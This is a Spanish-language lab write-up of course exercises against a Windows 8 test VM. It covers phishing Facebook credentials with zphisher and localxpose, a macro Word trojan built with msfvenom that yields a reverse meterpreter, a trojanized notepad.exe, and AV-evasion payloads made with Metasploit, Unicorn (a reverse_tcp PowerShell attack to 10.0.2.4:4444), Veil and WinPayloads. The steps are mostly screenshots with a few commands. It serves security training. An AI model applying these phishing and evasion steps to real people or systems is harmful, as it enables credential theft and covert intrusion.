# EJERCICIOS INGENIERÍA SOCIAL Y HERRAMIENTAS DE EVASIÓN
## Prerrequisitos
* Kali Linux
* Windows 8 Evasion
## Ejercicio 1 - Zphiser y Localxpose
* Realizar un ataque de phishing contra el sistema Windows 8 Evasion para obtener credenciales de Facebook.
* Clonamos `zphisher` desde su repositorio

```bash
git clone --depth=1 https://github.com/htr-tech/zphisher.git
```
* ejecutamos el archivo

![alt text](image.png)

* si todo va bien

![alt text](image-1.png)

* Seleccionamos el metodo de phising

![alt text](image-2.png)

* Seleccionamos la opcion tradicional

![alt text](image-3.png)

* Utilizamos `localXpose`, y configuramos el servicio. Por unica vez nos pedira el token debemos iniciar sesion para ello en `https://localxpose.io/`
![alt text](image-8.png)

![alt text](image-4.png)

* Enviamos la url fake

![alt text](image-5.png)

* Usamos la url en la maquina victima

![alt text](image-6.png)

* Despues de colocar las credenciales, se rescarga la pagina, devolviendo la pagian e facebook original, y mostrando las credenciales en la terminal de nuestra kali.

![alt text](image-7.png)

> **NOTA:** Podemos utilizar `maskphish` para generar un enlace enmascarado. 

```bash
git clone https://github.com/jaykali/maskphish
```


## Ejercicio 2 - Msfvenom y Macropack
* Crear un troyano con Msfvenom de tipo Visual Basic Application para despues convertirlo en un documento Word con macros maliciosas.

* Creamos el troyano.vba
![alt text](image-9.png)

* Convertimos en documento word, abrimos `LibreOffice`
![alt text](image-10.png)

* Configuramos para copiar el codigo vba
![alt text](image-11.png)

* Copiamos el codigo generado por `msfvenom`

![alt text](image-12.png)

* Cerramos, y guardamos como documento macros

![alt text](image-13.png)

* Transferimos el archivo, abrimos un servidor
![alt text](image-14.png)

* Desacargamos el documento `malicius` en la maquina victima `windows`

![alt text](image-15.png)


* Utilizar un exploit multi/handler para obtener un meterpreter reverso.

* Colocamos en escucha, Configuramos las opciones

![alt text](image-16.png)

* Ejecutamos el documento en la maquina victima y le damos habilitar

![alt text](image-18.png)

* si todo va bien, tenemos meterpreter

![alt text](image-17.png)

> **NOTA:** Para evitar que la sesión se cierre cuando el usuario cierra o deja de interactura con Word, se debe hacer persistencia con cualquiera de los metodos antes del cierre:

*  probar el docm en virus total.
![alt text](image-24.png)

https://www.elcursodelhacker.com/como-ocultar-un-payload-en-un-documento-de-word/

## Ejercicio 3 - Metasploit y Msfvenom
* A partir de la sesión obtenida anteriormente, crear un troyano que mantenga su comportamiento habitual usando algún archivo ejecutable legítimo del
sistema Windows 8 Evasion con Msfvenom.

* Antes de crear toyano verificamos algunos ejecutables legitimos que podemos usar, En este caso usare `notepad.exe`

```bash
meterpreter > shell
C:\Windows\system32> DIR
```
![alt text](image-19.png)

* Creamos el troyano usando el archivo legitimo, pero antes hacemos una copia del `notepad.exe`

![alt text](image-20.png)

![alt text](image-21.png)

* Demostrar que mantiene su comportamiento habitual ejecutándolo en el sistema Windows 8 Evasion y que crea una nueva sesión mediante un exploit
multi/handler para obtener otro meterpreter reverso.

* trasferimos el `troyano_legitimo.exe` creado

![alt text](image-22.png)

* Nos ponemos en escucha con `multi/hanlder`

![alt text](image-23.png)

* Verificamos que se encuentre el troyano 

```bash
meterpreter > ls C:\\Windows\\Temp
```
![alt text](image-27.png)

*  y lo ejecutamos el `troyano_legitimo`

```bash
meterpreter > execute -f C:\\Windows\\Temp\\troyano_legitimo.exe
```

![alt text](image-25.png)

* Verificamos las sessiones

![alt text](image-26.png)


## Ejercicio 4 - Metasploit
* Crear un troyano que pueda ejecutarse saltando la mayor cantidad posible de test de VirusTotal usando el módulo de evasion de metasploit
windows_defender.

* Iniciar metasploit y seleccionamos el modulo de `windows_defender.exe`

![alt text](image-28.png)

* Seleccionamos el modulo de evacion 3
```bash
msf6 use 3
msf6 evasion(windows/windows_defender_exe) > 
```

* Configuramos y generamos el `troyano`

![alt text](image-29.png)

* Comprobamos en la plataforma de `virus total`

![alt text](../Evacion_elinar_log/image-1.png)
## Ejercicio 5 - Unicorn
* Crear un troyano para Windows que pueda ejecutarse saltando la mayor cantidad posible de test de VirusTotal con Unicorn.
1. Desacragamos la herramienta Unicorn desde su repositorio
````bash
git clone https://github.com/trustedsec/unicorn.git
````

2. Una vez descargado ejecutamos el `unicorn.py`

```bash
cd unicorn/
./unicorn.py
```
![alt text](image-30.png)

3. Generamos un troyano para realizar un ataque de `PowerShell`

```bash
python unicorn.py windows/meterpreter/reverse_tcp 10.0.2.4 4444
```
4. Ahora esto nos dará dos archivos. Uno es un archivo de texto llamado `powershell_attack.txt` que tiene el código de powershell que se ejecutará en la máquina de la víctima utilizando ingeniería social y el otro es `unicorn.rc`, que es un archivo metasploit personalizado que establecerá automáticamente todos los parámetros e iniciará un oyente.

![alt text](image-31.png)

5. Probamos el troyano en `Virus Total`

![alt text](image-32.png)

## Ejercicio 6 - Veil
* Crea un troyano para Windows que pueda ejecutarse saltando la mayor cantidad posible de test de VirusTotal con Veil.

![alt text](image-33.png)

* Listamos los payloads
![alt text](image-34.png)

* Seleccionamos un payloads

![alt text](image-35.png)

* Configuramos opciones

![alt text](image-36.png)

* Generamos el payloads

![alt text](image-37.png)

* Probamos en `virus total`

![alt text](image-38.png)

## Ejercicio 7 - WinPayloads
* Crea un troyano para Windows que pueda ejecutarse saltando la mayor cantidad posible de test de VirusTotal con WinPayloads.

* Instalamos la herramienta con git
```bash
git clone https://github.com/nccgroup/Winpayloads.git
cd Winpayloads
./setup.sh
```

* Instalacion medinate docker

```bash
sudo docker pull charliedean07/winpayloads:latest

# una vez instaldo ejecutar el comando para iniciar
sudo docker run -e LANG=C.UTF-8 --net=host -it charliedean07/winpayloads
```

![alt text](image-39.png)
![alt text](image-40.png)

* Elegimos el payload y configuramos las opciones que nos pide 

![alt text](image-41.png)